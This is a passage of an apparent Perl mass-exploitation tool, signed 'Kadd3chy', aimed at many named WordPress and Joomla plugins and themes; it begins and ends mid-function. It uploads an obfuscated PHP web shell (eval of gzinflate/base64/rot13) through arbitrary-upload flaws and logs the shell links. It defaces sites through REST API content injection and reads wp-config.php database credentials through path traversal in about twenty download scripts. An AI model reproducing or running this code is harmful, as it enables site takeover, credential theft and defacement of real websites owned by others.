my @filesx = ('/index.php?option=com_b2jcontact&amp;view=loader&amp;owner=component&amp;id='.$out.'&amp;bid='.$bid.'&amp;root=&type=uploader&&owner=component&id='.$out.'&qqfile=586cfc73826e4-/../Kadd3chy.php','/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=586cfc73826e4-/../Kadd3chy.php','/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid='.$bid.'&id='.$out.'&Itemid='.$out.'&qqfile=586cfc73826e4-/../Kadd3chy.php','/index.php/component/b2jcontact/loader/module/'.$out.'/components/b2jcontact/'.$bid.'&qqfile=586cfc73826e4-/../Kadd3chy.php','/component/b2jcontact/loader/module/'.$out.'/components/b2jcontact/'.$bid.'&qqfile=586cfc73826e4-/../Kadd3chy.php','index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=586cfc73826e4-/../Kadd3chy.php','/index.php/contact/loader/component/'.$out.'/components/b2jcontact/1&qqfile=586cfc73826e4-/../Kadd3chy.php');
OUTER: foreach my $vulx(@filesx){
 my $izo = $site . $vulx; 
		print color('reset');		
my $index='<h5>Uploder Kadd3chy</h5>
<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>';
my $body = $ua->post( $izo,
        Content_Type => 'multipart/form-data',
        Content => $index
        );
		print color('bold red'),"waiting...\n";
		}
my $checkfoxupx = $ua->get("$site/components/com_b2jcontact/uploads/izoc.php")->content;
if ($checkfoxupx =~ /Kadd3chy/) {	
print color('bold red'),"Done Shell Uploaded\n";
print color('bold green'),"[ShellLink] => $site/components/com_b2jcontact/uploads/izoc.php\n";
		    print color('reset');
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/components/com_b2jcontact/uploads/izoc.php\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"B2j Contact";
print color('bold white')," Exploiting ...... ";
print color('bold red'),"Not Vulnerable\n";			
}
}
}
}
}
#############################################
sub developertools(){ 
my $url = "$site/wp-content/plugins/developer-tools/libs/swfupload/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'UPLOADDIR'=>'../', 'ADMINEMAIL'=>'moat3z.kadd3chy@gmail.com', 'Filedata' => ["Kadd3chy.php"]]);

$zoomerup="$site//wp-content/plugins/developer-tools/libs/Kadd3chy.php?";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"developer-tools";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"developer-tools";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable";
print color('bold white'),"\n";
}
}
#############################################
sub genesissimple(){ 
my $url = "$site/wp-content/plugins/genesis-simple-defaults/uploadFavicon.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'upload-favicon'=>'fake', 'iconImage' => ["Kadd3chy.php"]]);

$zoomerup="$site//wp-content/uploads/favicon/Kadd3chy.php";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"genesis-simple";
print color('bold white')," Exploiting ... ";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"genesis-simple";
print color('bold white')," Exploiting ... ";
print color('bold red'),"Not Vulnerable";
print color('bold white'),"\n";
}
}

################ joom plugin #####################
sub simpleplugin(){ 
my $url = "$site/administrator/components/com_simplephotogallery/lib/uploadFile.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => ['uploadfile' => ["Kadd3chy.php"], "jpath" => "..%2F..%2F..%2F..%2F" ]);

if ($response->content =~ /Kadd3chy(.*?)php/) {
$uploadfolder=$1.'php?';
}
$zoomerup="$site/Kadd3chy'.$uploadfolder.'";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com_simplephotogallery";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Done";
print color('bold white'),"\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $zoomerup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com_simplephotogallery";
print color('bold white')," ............ ";
print color('red'),"Not Vulnerable";
print color('bold white'),"\n";
}
}
################ comsexycontactform 2 #####################
sub sexycontactform2(){
my $url = "$site/com_sexycontactform/fileupload/index.php";
my $shell ="Kadd3chy.php";
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );

$sexyup="$site/com_sexycontactform/fileupload/files/Kadd3chy.php";

$checkpofxwup = $ua->get("$sexyup")->content;
if($checkpofxwup =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com sexycontactform2";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"   Done File Uploaded\n";
print color('bold white'),"   Shell Link => $sexyup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$sexyup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com sexycontactform2";
print color('bold white')," Exploiting .. ";
print color('red'),"Not Vulnerable\n";
}
}
################ Creative Contact Form #####################
sub sexycontactform(){ 
my $url = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php";
$sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/Kadd3chy.php";
my $field_name = "files[]";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["Kadd3chy.php"] ]
           
            );

$checksexycontactup = $ua->get("$sexycontactup")->content;
if($checksexycontactup =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Creative Contact Form";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $sexycontactup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$sexycontactup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Creative Contact Form";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ Work The Flow File Upload #####################
sub wtffu(){
my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/";
my $shell ="Kadd3chy.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/Kadd3chy.php";

$checkwtffup = $ua->get("$wtffup")->content;
if($checkwtffup =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Work The Flow File Upload";
print color('bold white')," ......... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $wtffup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wtffup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Work The Flow File Upload";
print color('bold white')," ......... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ WP Job Manger #####################
sub wpjm(){
my $url = "$site/jm-ajax/upload_file/";
my $image ="Kadd3chy.php";
my $field_name = "file[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$image"] ]
           
            );

$jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/$year/$month/Kadd3chy.gif";
$checkpofwup = $ua->get("$jobmangerup")->content_type;
if($checkpofwup =~/image\/gif/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"WP Job Manger";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Picture Uploaded\n";
print color('bold white'),"  Shell Link => $jobmangerup\n";
open (TEXT, '>>Result/Index.txt');
print TEXT "$jobmangerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"WP Job Manger";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

################  PHP Event Calendar #####################
sub phpeventcalendar(){
my $url = "$site/wp-content/plugins/php-event-calendar/server/file-uploader/";
my $shell ="Kadd3chy.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/Kadd3chy.php";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"PHP Event Calendar";
print color('bold white')," ................ ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $phpevup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$phpevup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"PHP Event Calendar";
print color('bold white')," ................ ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ Synoptic #####################
sub synoptic(){
my $url = "$site/wp-content/themes/synoptic/lib/avatarupload/upload.php";
my $shell ="Kadd3chy.php";
my $field_name = "qqfile";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$Synopticup="$site/wp-content/uploads/markets/avatars/Kadd3chy.php";

$checkSynopticup = $ua->get("$Synopticup")->content;
if($checkSynopticup =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Synoptic";
print color('bold white')," Exploiting ......... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $Synopticup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$Synopticup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Synoptic";
print color('bold white')," Exploiting ......... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ WPshop #####################
sub WPshop(){
my $url = "$site/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload";
my $shell ="Kadd3chy.php";
my $field_name = "wpshop_file";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wpshopup="$site/wp-content/uploads/Kadd3chy.php";

$checkwpshopup = $ua->get("$wpshopup")->content;
if($checkwpshopup =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Wp Shop";
print color('bold white')," Exploiting .......... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $wpshopup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wpshopup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"WP Shop";
print color('bold white')," Exploiting .......... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ Content Injection #####################
sub wpinjection(){
$linkposts = $site . 'index.php/wp-json/wp/v2/posts/';

$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;

$ajx = $site . '/wp-json/wp/v2/posts/'.$id;

$sirina=$id . 'justrawdata';
$index='<p align="center"><img border="0" src="http://vignette4.wikia.nocookie.net/trollpasta/images/3/34/Fuck-you-cartoon-meme.gif" width="339" height="476"></p><pre>&nbsp;</pre><div align="center"><p align="center" class="auto-style2">
    <font face="Bradley Hand ITC" size="6">Hacked By Kadd3chy</font></p>
    <p align="center" class="auto-style2">';
$gassface = POST $ajx, [
'id' => $sirina, 'slug' => '/m.htm', 'title' => 'Hacked By Kadd3chy ', 'content' => $index];
$response = $ua->request($gassface);
$stat = $response->content;
    if ($stat =~ /Kadd3chy/){
$urljson = "$site/m.htm";
$link = $ua->get($site);
$link = $link->request->uri;
print item(),"Content Injection";
print color('bold white')," ................. ";
print color('bold green'),"Vulnerable\n";
print item(),"Done Injected\n";
print color('bold white'),"  [Here] => $urljson\n\n";
open (TEXT, '>>Result/Index.txt');
print TEXT "$urljson\n";
close (TEXT);
}else{
print item(),"Content Injection";
print color('bold white')," ................. ";
print color('bold red'),"Not Vulnerable\n\n";
}
}
}

####################################################################################################

sub acento(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Acento Exploiting ........... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################

	
	
	
sub ajaxstore(){              print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"ajax-store-locator-wordpress_0 .... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
sub Antioch(){              print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Antioch Exploiting .......... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
	sub Authentic(){              print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Authentic Exploiting ........ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
	sub Churchope(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Churchope Exploiting ........ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
	
	
	sub Epic(){            print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Epic Exploiting ............. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/epic/includes/download.php?file=wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	
	
	
	
	
	
	
sub Felis(){              print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Felis Exploiting ............ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/felis/download.php?file=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
####################################################################################################
	

	
	
	
	
	
	
	sub Force(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Force-Download Exploiting ... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/force-download.php?file=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
####################################################################################################
	
	
	
	
	

	
	
sub FR0(){              print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"FR0_theme Exploiting ........ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/FR0_theme/down.php?path=$site/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print " VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
sub hbaudio(){            print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"hb-audio-gallery-lite ............. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	sub History(){            print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"History-collection ................ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	sub Imageex(){            print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Image-export Exploiting ..... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/image-export/download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	####################################################################################################

	
	
	
	
	
	sub kbslider(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"kbslider_show_image ............... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
	####################################################################################################

	
	
	sub Linenity(){              print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Linenity Exploiting ......... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	sub Lote27(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Lote27 Exploiting ........... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/lote27/download.php?download=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	
	
	
sub Markant(){              print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Markant Exploiting .......... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/markant/download.php?file=../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}

####################################################################################################
	
	
	sub MichaelCanthony(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"MichaelCanthony Exploiting .. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	sub mTheme(){            print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"mTheme-Unus Exploiting ...... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	sub NativeChurch(){            print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"NativeChurch Exploiting ..... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
